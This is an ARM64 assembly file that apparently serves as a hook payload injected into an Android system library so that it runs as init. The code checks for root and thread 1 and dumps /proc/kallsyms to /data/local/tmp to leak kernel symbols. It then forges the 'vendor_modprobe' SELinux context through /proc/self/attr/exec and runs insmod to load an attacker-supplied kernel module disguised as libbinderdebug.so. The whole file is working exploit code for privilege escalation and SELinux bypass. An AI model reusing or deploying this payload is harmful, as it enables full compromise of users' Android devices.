    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
kallsyms_path:
    .asciz "/proc/kallsyms"
ks_out_path:
    .asciz "/data/local/tmp/ks.txt"
ks_ok:
    .asciz "/dev/ksok"
ks_fail:
    .asciz "/dev/ksfail"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data

    .align 4

libcxx_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // Detect init tid = 1
    // We need thread 1 to use the default namespace
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    // ── dump /proc/kallsyms so the host can derive symbol offsets ─────
    stp     x19, x20, [sp, #-16]!
    sub     sp, sp, #4096

    mov     x0, -100
    adr     x1, kallsyms_path
    mov     x2, xzr
    mov     x8, #SYS_openat
    svc     0
    mov     x19, x0
    tbnz    w19, #31, 1f

    mov     x0, -100
    adr     x1, ks_out_path
    movl    x2, (O_WRONLY|O_CREAT|O_TRUNC|O_CLOEXEC)
    mov     x3, #0644
    mov     x8, #SYS_openat
    svc     0
    mov     x20, x0
    tbnz    w20, #31, 2f

3:
    mov     x0, x19
    mov     x1, sp
    mov     x2, #4096
    mov     x8, #SYS_read
    svc     0
    cmp     x0, #0
    b.le    4f
    mov     x2, x0
    mov     x0, x20
    mov     x1, sp
    mov     x8, #SYS_write
    svc     0
    b       3b

4:
    mov     x0, x20
    mov     x8, #SYS_close
    svc     0
    mov     x0, x19
    mov     x8, #SYS_close
    svc     0
    create_mark ks_ok
    b       5f
2:
    mov     x0, x19
    mov     x8, #SYS_close
    svc     0
1:
    create_mark ks_fail
5:
    add     sp, sp, #4096
    ldp     x19, x20, [sp], #16

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   |
    //       CLONE_CHILD_CLEARTID |
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr              // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
    str     w0, [sp, 8]         // save id
    add     sp, sp, 16

    cbnz    w0, return          // parent returns to init

    // ── worker child ──────────────────────────────────────────────────────
    sub     sp, sp, 32

    // Fork grandchild: set SELinux exec context → execve insmod
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0
    cbnz    w0, myexit

    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0

    // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
    adr     x1, exe_path
    str     x1, [sp]
    adr     x1, ko_target
    str     x1, [sp, 8]
    str     xzr, [sp, 16]
    adr     x0, exe_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

myexit:
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
libcxx_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
